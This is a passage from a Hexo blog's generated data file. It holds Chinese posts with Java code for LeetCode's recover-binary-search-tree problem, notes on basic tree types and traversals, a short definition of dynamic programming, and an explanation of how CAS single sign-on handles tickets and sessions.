List&lt;Integer&gt; list = Arrays.asList(1,3,null,null,2);</span><br><span class=\"line\">        Tree tree = new TreeTest().new Tree(list);</span><br><span class=\"line\">        new TreeTest().recoverTree(tree.root);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"2-优化1\"><a href=\"#2-优化1\" class=\"headerlink\" title=\"2.优化1\"></a>2.优化1</h2>","site":{"data":{}},"excerpt":"","more":"<p><a href=\"https://leetcode.com/problems/recover-binary-search-tree/\" target=\"_blank\" rel=\"noopener\">https://leetcode.com/problems/recover-binary-search-tree/</a></p>\n<h1 id=\"一-原理\"><a href=\"#一-原理\" class=\"headerlink\" title=\"一.原理\"></a>一.原理</h1><p>二叉查找树的性质决定了，它的中序遍历(左根右) 为递增序列。<br></p>\n<p>所以对二叉树进行中序遍历，判断是否大小有序，找到第一出现前面的值大于后面的值的位置index,和index1大于的最后一个值的index2,交换index1和index2的值.</p>\n<h1 id=\"二-实现\"><a href=\"#二-实现\" class=\"headerlink\" title=\"二.实现\"></a>二.实现</h1><h2 id=\"1-基本实现\"><a href=\"#1-基本实现\" class=\"headerlink\" title=\"1.基本实现\"></a>1.基本实现<br></h2><p>Runtime: 4 ms, faster than 22.08%<br><br>Memory Usage: 39.8 MB, less than 80.77%<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Solution &#123;</span><br><span class=\"line\">    public void recoverTree(TreeNode root) &#123;</span><br><span class=\"line\">        List&lt;TreeNode&gt; list = inOrder(root);</span><br><span class=\"line\"></span><br><span class=\"line\">        //标记错误的两个位置</span><br><span class=\"line\">        int index1 = 0;</span><br><span class=\"line\">        int index2 = 0;</span><br><span class=\"line\">        //第一个错误的值</span><br><span class=\"line\">        Integer value1 = null;</span><br><span class=\"line\">        //是否发现第一个错误位置</span><br><span class=\"line\">        boolean lockIndex1 = false;</span><br><span class=\"line\"></span><br><span class=\"line\">        for (int i = 0; i&lt;list.size(); i++)&#123;</span><br><span class=\"line\">            //跳过null</span><br><span class=\"line\">            if(list.get(i) != null)&#123;</span><br><span class=\"line\">                //初始化赋值</span><br><span class=\"line\">                if(value1 == null )&#123;</span><br><span class=\"line\">                    value1 = list.get(i).val;</span><br><span class=\"line\">                    index1 = i;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                //逐渐向后比较，找到最终index2位置</span><br><span class=\"line\">                if(value1 &gt; list.get(i).val)&#123;</span><br><span class=\"line\">                    index2 = i;</span><br><span class=\"line\">                    lockIndex1 = true;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                //锁定index1位置</span><br><span class=\"line\">                if(!lockIndex1)&#123;</span><br><span class=\"line\">                    value1 = list.get(i).val;</span><br><span class=\"line\">                    index1 = i;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            //交换值</span><br><span class=\"line\">            if(i == list.size() -1)&#123;</span><br><span class=\"line\">                list.get(index1).val = list.get(index2).val;</span><br><span class=\"line\">                list.get(index2).val = value1;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        //list.stream().map(e -&gt; e.val).forEach(System.out::println);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        //中序遍历</span><br><span class=\"line\">    List&lt;TreeNode&gt; list = new LinkedList&lt;&gt;();</span><br><span class=\"line\">    public List&lt;TreeNode&gt; inOrder(TreeNode root)&#123;</span><br><span class=\"line\">        if(root != null)&#123;</span><br><span class=\"line\">            //遍历它的左下级节点</span><br><span class=\"line\">            inOrder(root.left);</span><br><span class=\"line\">            list.add(root);</span><br><span class=\"line\">            //左节点完后，遍历右节点</span><br><span class=\"line\">            inOrder(root.right);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>包括树的构建赋值的全代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.util.ArrayList;</span><br><span class=\"line\">import java.util.Arrays;</span><br><span class=\"line\">import java.util.LinkedList;</span><br><span class=\"line\">import java.util.List;</span><br><span class=\"line\"></span><br><span class=\"line\">public class TreeTest &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    class TreeNode &#123;</span><br><span class=\"line\">        Integer val;</span><br><span class=\"line\">        TreeNode left;</span><br><span class=\"line\">        TreeNode right;</span><br><span class=\"line\"></span><br><span class=\"line\">        TreeNode(Integer x) &#123;</span><br><span class=\"line\">            this.val = x;</span><br><span class=\"line\">            this.right = null;</span><br><span class=\"line\">            this.left = null;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class Tree&#123;</span><br><span class=\"line\">        TreeNode root = null;</span><br><span class=\"line\">        List&lt;TreeNode&gt; nodeList = new ArrayList&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">        Tree(List&lt;Integer&gt; list)&#123;</span><br><span class=\"line\">            for(Integer data: list)&#123;</span><br><span class=\"line\">               nodeList.add(new TreeNode(data));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            //按层次遍历顺序初始化二叉树</span><br><span class=\"line\">            for(int row=0; nodeList.size() &gt;= Math.pow(2, row) -1 &amp;&amp; nodeList.size() &gt;= Math.pow(2, row) -1 ; row++)&#123;</span><br><span class=\"line\">                for(int col=0; col&lt;Math.pow(2,row); col++)&#123;</span><br><span class=\"line\">                    //当前节点</span><br><span class=\"line\">                    int index = (int)Math.pow(2, row) + col - 1;</span><br><span class=\"line\">                    //当前节点的子节点</span><br><span class=\"line\">                    int index2 = (int)Math.pow(2, row + 1) + 2*col - 1;</span><br><span class=\"line\"></span><br><span class=\"line\">                    if(nodeList.size()&gt; index)&#123;</span><br><span class=\"line\">                        //有左右节点</span><br><span class=\"line\">                        if (nodeList.size()&gt; index2+1 )&#123;</span><br><span class=\"line\">                            nodeList.get(index).left = nodeList.get(index2);</span><br><span class=\"line\">                            nodeList.get(index).right = nodeList.get(index2+1);</span><br><span class=\"line\">                        //只有左节点</span><br><span class=\"line\">                        &#125;else if(nodeList.size()&gt; index2)&#123;</span><br><span class=\"line\">                            nodeList.get(index).left = nodeList.get(index2);</span><br><span class=\"line\">                            nodeList.get(index).right = null;</span><br><span class=\"line\">                        //没有子节点</span><br><span class=\"line\">                        &#125;else &#123;</span><br><span class=\"line\">                            nodeList.get(index).left = null;</span><br><span class=\"line\">                            nodeList.get(index).right = null;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            //返回根节点</span><br><span class=\"line\">            root = nodeList.get(0);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //中序遍历</span><br><span class=\"line\">    List&lt;TreeNode&gt; list = new LinkedList&lt;&gt;();</span><br><span class=\"line\">    public List&lt;TreeNode&gt; inOrder(TreeNode root)&#123;</span><br><span class=\"line\">        if(root != null)&#123;</span><br><span class=\"line\">            //遍历它的左下级节点</span><br><span class=\"line\">            inOrder(root.left);</span><br><span class=\"line\">            list.add(root);</span><br><span class=\"line\">            //左节点完后，遍历右节点</span><br><span class=\"line\">            inOrder(root.right);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 二叉查找树恢复</span><br><span class=\"line\">    public void recoverTree(TreeNode root) &#123;</span><br><span class=\"line\">        List&lt;TreeNode&gt; list = inOrder(root);</span><br><span class=\"line\"></span><br><span class=\"line\">        //标记错误的两个位置</span><br><span class=\"line\">        int index1 = 0;</span><br><span class=\"line\">        int index2 = 0;</span><br><span class=\"line\">        //第一个错误的值</span><br><span class=\"line\">        Integer value1 = null;</span><br><span class=\"line\">        //是否发现第一个错误位置</span><br><span class=\"line\">        boolean lockIndex1 = false;</span><br><span class=\"line\"></span><br><span class=\"line\">        for (int i = 0; i&lt;list.size(); i++)&#123;</span><br><span class=\"line\">            //跳过null</span><br><span class=\"line\">            if(list.get(i).val != null)&#123;</span><br><span class=\"line\">                //初始化赋值</span><br><span class=\"line\">                if(value1 == null )&#123;</span><br><span class=\"line\">                    value1 = list.get(i).val;</span><br><span class=\"line\">                    index1 = i;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                //逐渐向后比较，找到最终index2位置</span><br><span class=\"line\">                if(value1 &gt; list.get(i).val)&#123;</span><br><span class=\"line\">                    index2 = i;</span><br><span class=\"line\">                    lockIndex1 = true;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                //锁定index1位置</span><br><span class=\"line\">                if(!lockIndex1)&#123;</span><br><span class=\"line\">                    value1 = list.get(i).val;</span><br><span class=\"line\">                    index1 = i;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            //交换值</span><br><span class=\"line\">            if(i == list.size() -1)&#123;</span><br><span class=\"line\">                list.get(index1).val = list.get(index2).val;</span><br><span class=\"line\">                list.get(index2).val = value1;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       //list.stream().map(e -&gt; e.val).forEach(System.out::println);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\">        List&lt;Integer&gt; list = Arrays.asList(1,3,null,null,2);</span><br><span class=\"line\">        Tree tree = new TreeTest().new Tree(list);</span><br><span class=\"line\">        new TreeTest().recoverTree(tree.root);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"2-优化1\"><a href=\"#2-优化1\" class=\"headerlink\" title=\"2.优化1\"></a>2.优化1</h2>"},{"title":"树的基本概念","date":"2019-08-09T18:30:33.000Z","_content":"\n## 一.常见树\n\n### 1.树\n\n树（Tree） 一种基本数据结构。\n\n### 2. 二叉树\n\n每个节点只能有两条分叉的树。\n\n### 3.二叉查找树\n\n一个节点的左子节点的值小于这个节点，右子节点的值大于或等于这个父节点。<br>\n注意，这里的值，实际上就是节点的key.<br>\n\n### 4.平衡二叉树\n\n也叫平衡二叉查找树 ，自平衡二叉树，或 AVL树<br>\n\n特点:\n\n- 可以是空树。<br>\n\n- 假如不是空树，任何一个结点的左子树与右子树都是平衡二叉树，并且高度之差的绝对值不超过1<br>\n\n### 5.B树\n\n多路查找的平衡树\n\n### 6.B+树\n\nB+树是B树的一个升级版，相对于B树来说B+树更充分的利用了节点的空间，让查询速度更加稳定，其速度完全接近于二分法查找。\n\n\n### 7.红黑树\n\n红黑树是每个节点都带有颜色属性的二叉查找树，颜色为红色或黑色，是一种自平衡二叉查找树。\n\n## 二.遍历\n\n- 前序遍历\n\n根结点 ---> 左子树 ---> 右子树\n\n- 中序遍历\n\n左子树---> 根结点 ---> 右子树\n\n- 后序遍历\n\n左子树 ---> 右子树 ---> 根结点\n\n- 层次遍历\n\n只需按层次遍历即可，从上到下，从左到右\n\n- 深度优先遍历\n\n在数中， 相当于 前序遍历\n\n- 广度优先遍历\n\n在树中相当于 层次遍历\n","source":"_posts/algorithm/tree/二叉树基本概念.md","raw":"---\ntitle: 树的基本概念\ndate: 2019-08-09 14:30:33\ntags: [algorithm]\n---\n\n## 一.常见树\n\n### 1.树\n\n树（Tree） 一种基本数据结构。\n\n### 2. 二叉树\n\n每个节点只能有两条分叉的树。\n\n### 3.二叉查找树\n\n一个节点的左子节点的值小于这个节点，右子节点的值大于或等于这个父节点。<br>\n注意，这里的值，实际上就是节点的key.<br>\n\n### 4.平衡二叉树\n\n也叫平衡二叉查找树 ，自平衡二叉树，或 AVL树<br>\n\n特点:\n\n- 可以是空树。<br>\n\n- 假如不是空树，任何一个结点的左子树与右子树都是平衡二叉树，并且高度之差的绝对值不超过1<br>\n\n### 5.B树\n\n多路查找的平衡树\n\n### 6.B+树\n\nB+树是B树的一个升级版，相对于B树来说B+树更充分的利用了节点的空间，让查询速度更加稳定，其速度完全接近于二分法查找。\n\n\n### 7.红黑树\n\n红黑树是每个节点都带有颜色属性的二叉查找树，颜色为红色或黑色，是一种自平衡二叉查找树。\n\n## 二.遍历\n\n- 前序遍历\n\n根结点 ---> 左子树 ---> 右子树\n\n- 中序遍历\n\n左子树---> 根结点 ---> 右子树\n\n- 后序遍历\n\n左子树 ---> 右子树 ---> 根结点\n\n- 层次遍历\n\n只需按层次遍历即可，从上到下，从左到右\n\n- 深度优先遍历\n\n在数中， 相当于 前序遍历\n\n- 广度优先遍历\n\n在树中相当于 层次遍历\n","slug":"algorithm/tree/二叉树基本概念","published":1,"updated":"2019-10-13T12:15:12.168Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321lc003s6dcp0ccia5d0","content":"<h2 id=\"一-常见树\"><a href=\"#一-常见树\" class=\"headerlink\" title=\"一.常见树\"></a>一.常见树</h2><h3 id=\"1-树\"><a href=\"#1-树\" class=\"headerlink\" title=\"1.树\"></a>1.树</h3><p>树（Tree） 一种基本数据结构。</p>\n<h3 id=\"2-二叉树\"><a href=\"#2-二叉树\" class=\"headerlink\" title=\"2. 二叉树\"></a>2. 二叉树</h3><p>每个节点只能有两条分叉的树。</p>\n<h3 id=\"3-二叉查找树\"><a href=\"#3-二叉查找树\" class=\"headerlink\" title=\"3.二叉查找树\"></a>3.二叉查找树</h3><p>一个节点的左子节点的值小于这个节点，右子节点的值大于或等于这个父节点。<br><br>注意，这里的值，实际上就是节点的key.<br></p>\n<h3 id=\"4-平衡二叉树\"><a href=\"#4-平衡二叉树\" class=\"headerlink\" title=\"4.平衡二叉树\"></a>4.平衡二叉树</h3><p>也叫平衡二叉查找树 ，自平衡二叉树，或 AVL树<br></p>\n<p>特点:</p>\n<ul>\n<li><p>可以是空树。<br></p>\n</li>\n<li><p>假如不是空树，任何一个结点的左子树与右子树都是平衡二叉树，并且高度之差的绝对值不超过1<br></p>\n</li>\n</ul>\n<h3 id=\"5-B树\"><a href=\"#5-B树\" class=\"headerlink\" title=\"5.B树\"></a>5.B树</h3><p>多路查找的平衡树</p>\n<h3 id=\"6-B-树\"><a href=\"#6-B-树\" class=\"headerlink\" title=\"6.B+树\"></a>6.B+树</h3><p>B+树是B树的一个升级版，相对于B树来说B+树更充分的利用了节点的空间，让查询速度更加稳定，其速度完全接近于二分法查找。</p>\n<h3 id=\"7-红黑树\"><a href=\"#7-红黑树\" class=\"headerlink\" title=\"7.红黑树\"></a>7.红黑树</h3><p>红黑树是每个节点都带有颜色属性的二叉查找树，颜色为红色或黑色，是一种自平衡二叉查找树。</p>\n<h2 id=\"二-遍历\"><a href=\"#二-遍历\" class=\"headerlink\" title=\"二.遍历\"></a>二.遍历</h2><ul>\n<li>前序遍历</li>\n</ul>\n<p>根结点 —&gt; 左子树 —&gt; 右子树</p>\n<ul>\n<li>中序遍历</li>\n</ul>\n<p>左子树—&gt; 根结点 —&gt; 右子树</p>\n<ul>\n<li>后序遍历</li>\n</ul>\n<p>左子树 —&gt; 右子树 —&gt; 根结点</p>\n<ul>\n<li>层次遍历</li>\n</ul>\n<p>只需按层次遍历即可，从上到下，从左到右</p>\n<ul>\n<li>深度优先遍历</li>\n</ul>\n<p>在数中， 相当于 前序遍历</p>\n<ul>\n<li>广度优先遍历</li>\n</ul>\n<p>在树中相当于 层次遍历</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"一-常见树\"><a href=\"#一-常见树\" class=\"headerlink\" title=\"一.常见树\"></a>一.常见树</h2><h3 id=\"1-树\"><a href=\"#1-树\" class=\"headerlink\" title=\"1.树\"></a>1.树</h3><p>树（Tree） 一种基本数据结构。</p>\n<h3 id=\"2-二叉树\"><a href=\"#2-二叉树\" class=\"headerlink\" title=\"2. 二叉树\"></a>2. 二叉树</h3><p>每个节点只能有两条分叉的树。</p>\n<h3 id=\"3-二叉查找树\"><a href=\"#3-二叉查找树\" class=\"headerlink\" title=\"3.二叉查找树\"></a>3.二叉查找树</h3><p>一个节点的左子节点的值小于这个节点，右子节点的值大于或等于这个父节点。<br><br>注意，这里的值，实际上就是节点的key.<br></p>\n<h3 id=\"4-平衡二叉树\"><a href=\"#4-平衡二叉树\" class=\"headerlink\" title=\"4.平衡二叉树\"></a>4.平衡二叉树</h3><p>也叫平衡二叉查找树 ，自平衡二叉树，或 AVL树<br></p>\n<p>特点:</p>\n<ul>\n<li><p>可以是空树。<br></p>\n</li>\n<li><p>假如不是空树，任何一个结点的左子树与右子树都是平衡二叉树，并且高度之差的绝对值不超过1<br></p>\n</li>\n</ul>\n<h3 id=\"5-B树\"><a href=\"#5-B树\" class=\"headerlink\" title=\"5.B树\"></a>5.B树</h3><p>多路查找的平衡树</p>\n<h3 id=\"6-B-树\"><a href=\"#6-B-树\" class=\"headerlink\" title=\"6.B+树\"></a>6.B+树</h3><p>B+树是B树的一个升级版，相对于B树来说B+树更充分的利用了节点的空间，让查询速度更加稳定，其速度完全接近于二分法查找。</p>\n<h3 id=\"7-红黑树\"><a href=\"#7-红黑树\" class=\"headerlink\" title=\"7.红黑树\"></a>7.红黑树</h3><p>红黑树是每个节点都带有颜色属性的二叉查找树，颜色为红色或黑色，是一种自平衡二叉查找树。</p>\n<h2 id=\"二-遍历\"><a href=\"#二-遍历\" class=\"headerlink\" title=\"二.遍历\"></a>二.遍历</h2><ul>\n<li>前序遍历</li>\n</ul>\n<p>根结点 —&gt; 左子树 —&gt; 右子树</p>\n<ul>\n<li>中序遍历</li>\n</ul>\n<p>左子树—&gt; 根结点 —&gt; 右子树</p>\n<ul>\n<li>后序遍历</li>\n</ul>\n<p>左子树 —&gt; 右子树 —&gt; 根结点</p>\n<ul>\n<li>层次遍历</li>\n</ul>\n<p>只需按层次遍历即可，从上到下，从左到右</p>\n<ul>\n<li>深度优先遍历</li>\n</ul>\n<p>在数中， 相当于 前序遍历</p>\n<ul>\n<li>广度优先遍历</li>\n</ul>\n<p>在树中相当于 层次遍历</p>\n"},{"title":"动态规划算法","date":"2019-06-05T19:03:33.000Z","_content":"\n\n### 动态规划原理\n将最终问题分解为多个子问题，先解决子问题，再根据子问题结果解决父问题。\n","source":"_posts/algorithm/动态规划/dynamic-programing.md","raw":"---\ntitle: 动态规划算法\ndate: 2019-6-5 15:03:33\ntags: [algorithm]\n---\n\n\n### 动态规划原理\n将最终问题分解为多个子问题，先解决子问题，再根据子问题结果解决父问题。\n","slug":"algorithm/动态规划/dynamic-programing","published":1,"updated":"2019-10-13T12:15:12.168Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321ld003u6dcpko20maiu","content":"<h3 id=\"动态规划原理\"><a href=\"#动态规划原理\" class=\"headerlink\" title=\"动态规划原理\"></a>动态规划原理</h3><p>将最终问题分解为多个子问题，先解决子问题，再根据子问题结果解决父问题。</p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"动态规划原理\"><a href=\"#动态规划原理\" class=\"headerlink\" title=\"动态规划原理\"></a>动态规划原理</h3><p>将最终问题分解为多个子问题，先解决子问题，再根据子问题结果解决父问题。</p>\n"},{"title":"Cas 单点登录原理","date":"2019-05-30T20:30:07.000Z","_content":"### 单点登录\n单点登录（Single Sign-On ,简称SSO),只用户只需在一个地方登录，就能保持登录状态访问所有相互信任的子系统。\n\n### CAS\nCAS 为 Central Authentication Service。<br>\nCAS 分为 CAS Server 和 CAS Client.<br>\n- CAS Server 负责用户的认证和授权\n- CAS Client 与受保护的客户端应用部署在一起，负责认证用户是否登录,同时负责处理对客户端受保护资源的访问请求，需要登录时，重定向到CAS Server，以Filter方式保护受保护的资源。\n\n#### 一.授权与登录操作\n###### 1.未登录时\n![cas01](http://67.216.218.49:8000/file/blogs/base/cas/cas01.png)\n如图:<br>\n- (1)客户端(即浏览器)请求资源(需要登录的受限资源)，CAS Client发现无权限(未登录，通过cookies中JSESSIONID判断是否登录)，尝试获取ticket(未获取到)。\n- (2)CAS Client 返回重定向(CAS Server 登录地址)并在请求地址中带上原本要请求的资源地址，客户端请求该地址(重定向自动请求)获取ticket，此时ticket不存在(未登录)，返回登录页面。\n- (3)客户端进行登录(带上认证信息，原本的请求资源地址，sessionid,sessionid为CAS Client生成)，CAS Server 验证通过，生成与sessionid进行关联的TGT与ST,将请求的cookie中jsessionid设置为传过来的sessionid，并返回重定向(要请求的资源地址，带上ticket(ST))\n![cas_session01](http://67.216.218.49:8000/file/blogs/base/cas/cas_sessionid01.png)\n将会话的jsessionid设置为图中1.\n- (4)此时，CAS Client发现请求无权限(未登录)，尝试获取ticket(获取到),CAS Client拿着ticket去CAS Server 进行认证\n- (5)此时，CAS Server 发现该ticket认证通过，返回登录成功的信息，CAS Client(可以理解为服务端) 利用前面设置的JSESSIONID为该用户创建session会话，维护登录状态(JSESSIONID)，并返回原本受限的请求资源\n\n###### 2.已登录时\n当已登录的用户第一次访问其它互相信任的系统时：<br>\n- (1)客户端请求资源(需要登录的受限资源)，CAS Client发现无权限(此时该系统还未登录过，session会话未创建)，尝试获取ticket(未获取到)。\n- (2)CAS Client 返回重定向(CAS Server 登录地址)并在请求地址中带上原本要请求的资源地址，客户端请求该地址(重定向自动请求)根据session获取ticket，此时ticket已存在,重定向请求。\n- (3)此时，CAS Client发现请求无权限(未登录)，尝试获取ticket(获取到),CAS Client拿着ticket去CAS Server 进行认证，认证成功后设置该域的session.\n- (4)此时，CAS Server 发现该ticket认证通过，返回登录成功的信息，CAS Client 为该用户创建session会话，保存在域下的登录状态，返回原本受限的请求资源。\n\n#### 二.登录状态判断\n已登录的用户在再次请求受限资源时，不能每次都去认证中心(CAS Server)判断是否登录(效率低)。<br>\n![cas01](http://67.216.218.49:8000/file/blogs/base/cas/cas_cookie01.png)\n当一个已经登录过的用户，再次请求该系统资源时，CAS Client会去session中查找用户信息(通过请求头的cookie中JSESSIONID字段的值)，判断是否登录。不用再去CAS Server认证。<br>\n不同的域，各自维护自己的session.<br>\n\n#### 三.退出\n- (1)客户端向当前web应用发起退出请求。\n- (2)应用取消本地会话session，同时通知CAS Server，用户已登出，清除TGT。\n- (3)应用返回客户端登出请求。\n- (4)CAS Server 通知所有用户登录访问的应用，用户已登出。\n\n#### 四.CAS中的ticket\n- TGT：TGT是CAS为用户签发的登录票据，拥有了TGT，用户就可以证明自己在CAS成功登录过。TGT封装了Cookie值以及此Cookie值对应的用户信息。用户在CAS 认证成功后，CAS生成cookie，写入浏览器，同时生成一个TGT对象，放入自己的缓存，TGT对象的ID就是cookie的值。当HTTP再次请求到来时，如果传过来的有CAS生成的cookie，则CAS以此cookie值为key查询缓存中有无TGT ，如果有的话，则说明用户之前登录过，如果没有，则用户需要重新登录。\n- ST：服务票据，ST是CAS为用户签发的访问某一service的票据。用户访问service时，service发现用户没有ST，则要求用户去CAS获取ST。用户向CAS发出获取ST的请求，如果用户的请求中包含cookie，则CAS会以此cookie值为key查询缓存中有无TGT，如果存在TGT，则用此TGT签发一个ST，返回给用户。用户凭借ST去访问service，service拿ST去CAS验证，验证通过后，允许用户访问资源。\n- LT: 定制login页面时候，提交以后还是要提交到cas进行验证，那么参数中需要带lt，这个lt必须在前面获取到，防止重复提交之类的作用。\n- TGC:在系统A登录成功后，用户和认证中心之间建立起了全局会话，这个全局会话就是TGT(Ticket Granting Ticket)，TGT位于CAS服务器端，TGT并没有放在Session中，也就是说，CAS全局会话的实现并没有直接使用Session机制，而是利用了Cookie自己实现的，这个Cookie叫做TGC(Ticket Granting Cookie)，它存放了TGT的id(jsessionid),保存在用户浏览器上\n","source":"_posts/base/cas-sso/cas.md","raw":"---\ntitle: Cas 单点登录原理\ndate: 2019-5-30 16:30:07\ntags: [base]\n---\n### 单点登录\n单点登录（Single Sign-On ,简称SSO),只用户只需在一个地方登录，就能保持登录状态访问所有相互信任的子系统。\n\n### CAS\nCAS 为 Central Authentication Service。<br>\nCAS 分为 CAS Server 和 CAS Client.<br>\n- CAS Server 负责用户的认证和授权\n- CAS Client 与受保护的客户端应用部署在一起，负责认证用户是否登录,同时负责处理对客户端受保护资源的访问请求，需要登录时，重定向到CAS Server，以Filter方式保护受保护的资源。\n\n#### 一.授权与登录操作\n###### 